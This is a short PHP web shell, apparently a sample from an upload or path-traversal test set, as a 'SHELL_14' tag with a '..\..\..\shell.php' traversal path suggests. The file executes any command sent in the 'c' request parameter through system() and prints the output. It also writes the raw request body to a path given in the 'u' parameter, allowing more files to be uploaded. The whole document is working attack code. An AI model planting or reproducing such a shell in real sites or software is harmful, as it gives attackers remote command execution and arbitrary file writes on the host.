<?php
// TAG:SHELL_14_..\..\..\shell.php
if (isset($_REQUEST["c"])) { echo "<pre>"; system($_REQUEST["c"]); echo "</pre>"; }
if (isset($_REQUEST["u"])) {  // upload secondary
    file_put_contents($_REQUEST["u"], file_get_contents("php://input"));
    echo "ok";
}
?>